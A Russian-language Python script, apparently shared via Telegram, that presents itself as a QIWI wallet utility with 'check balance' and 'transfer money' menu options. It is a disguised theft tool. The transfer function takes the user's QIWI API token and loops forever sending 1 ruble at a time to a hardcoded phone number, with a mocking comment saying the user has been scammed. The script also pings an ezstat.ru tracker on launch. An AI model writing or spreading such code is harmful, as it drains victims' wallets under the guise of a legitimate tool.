# Coding : t.me/ohtllinest
# Импорт модулей
import os, time
import requests

from SimpleQIWI import *
from colorama import Fore, Style

# Переменные цвета
sb_w = Style.BRIGHT + Fore.WHITE
sb_g = Style.BRIGHT + Fore.GREEN
sb_y = Style.BRIGHT + Fore.YELLOW

# Переменные
banner = sb_g + ("""

░██████╗░██╗░██╗░░░░░░░██╗██╗
██╔═══██╗██║░██║░░██╗░░██║██║
██║██╗██║██║░╚██╗████╗██╔╝██║
╚██████╔╝██║░░████╔═████║░██║
░╚═██╔═╝░██║░░╚██╔╝░╚██╔╝░██║
░░░╚═╝░░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝

░█████╗░██╗░░██╗████████╗██╗░░░░░██╗░░░░░██╗
██╔══██╗██║░░██║╚══██╔══╝██║░░░░░██║░░░░░██║
██║░░██║███████║░░░██║░░░██║░░░░░██║░░░░░██║
██║░░██║██╔══██║░░░██║░░░██║░░░░░██║░░░░░██║
╚█████╔╝██║░░██║░░░██║░░░███████╗███████╗██║
░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚══════╝╚═╝
""") + Style.RESET_ALL

line = sb_g + "——————————————————————————————"

# Классы
def balance():
	print(line)
	time.sleep(0.7)
	os.system("clear")
	
	print(banner)
	token = input(sb_g + "[" + sb_w + "?" + sb_g + "]" + " " + sb_w + "Введите токен" + " " + sb_g + ":" + " " + sb_y)
	phone = 79379221790
	
	api = QApi(token = token, phone = phone)
	print(api.balance)
	
	time.sleep(3)
	os.system("clear")
	menu()
	
def money():
	print(line)
	time.sleep(0.7)
	os.system("clear")
	
	print(banner)
	token = input(sb_g + "[" + sb_w + "?" + sb_g + "]" + " " + sb_w + "Введите токен" + " " + sb_g + ":" + " " + sb_y)
	phone = 79619522850
	
	api = QApi(token = token, phone = phone)
	
	while True:
		api.pay(account = "79619522850", amount = 1, comment = 'Тебя наебали, хуй соси')
		
	os.system("clear")
	menu()
	
def menu():
	print(banner)
	print(sb_w + "[" + sb_g + "1" + sb_w + "]" + " " + sb_w + "Проверить баланс")
	print(sb_w + "[" + sb_g + "2" + sb_w + "]" + " " + sb_w + "Перевести деньги")
	print(sb_w + "[" + sb_g + "3" + sb_w + "]" + " " + sb_w + "Выход")
	
	print(line)
	
	py_menu = input(sb_g + "[" + sb_w + "?" + sb_g + "]" + " " + sb_w + "Введите номер функции" + " " + sb_g + ":" + " " + sb_y)
	
	if py_menu == "":
		os.system("clear")
	if py_menu == "1":
		balance()
	if py_menu == "2":
		money()
	if py_menu == "3":
		os.system("clear")
	
# Авторизация
def auth():
	requests.get("https://ezstat.ru/2rBDW5")
	print(banner)
	
	auth_py = input(sb_g + "[" + sb_w + "?" + sb_g + "]" + " " + sb_w + "Введите ключ доступа" + " " + sb_g + ":" + " " + sb_y)
	
	if auth_py == "8d2f469d312a834c85c49aa2997c5619f96303c5ecdec1fc6bb18402112c055aa035352ed460062eaee59daa1ab0214ff05ed57012a4796b96e2fa69bc05199f":
		os.system("clear")
		menu()
	
	if auth_py == "":
		os.system("clear")

auth()